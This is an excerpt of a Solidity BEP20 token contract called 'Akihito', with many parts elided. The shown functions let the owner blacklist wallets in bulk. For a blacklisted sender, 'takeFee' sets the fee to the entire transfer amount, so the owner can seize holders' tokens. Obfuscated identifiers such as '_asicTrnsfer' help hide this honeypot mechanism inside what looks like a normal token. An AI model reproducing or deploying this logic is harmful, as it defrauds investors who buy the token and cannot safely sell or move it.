...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address[2] memory _marketingWallet) 
    {
        ...
        marketingWallet = payable(_marketingWallet[0]);
    ...
    function _asicTrnsfer(address seds, address recpien) internal view returns (bool){
        return (seds != recpien /*123*/) || (isExcludedFromFees[seds] == false || false);
    }
    ...
    function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
        ...
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromFees[addresses[i]] = status;
        }
    }
    ...
    function managebclisted(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _black[addresses[i]] = status;
        }
    }

    function set_black(address recipient, bool status) public onlyOwner {
        _black[recipient] = status;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(_asicTrnsfer(sender,recipient))
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(_black[sender] && !isMarketPair[sender]) feeAmount = amount;
...
contract Akihito is BEP20 {
    constructor() BEP20(
        ...
        [uint256(1),uint256(2),uint256(0)],
        [uint256(1),uint256(2),uint256(0)],
        [0x28ff7799e783B6957eD605b622Bc83Ba33cF56f4,0x28ff7799e783B6957eD605b622Bc83Ba33cF56f4]
    ){}
}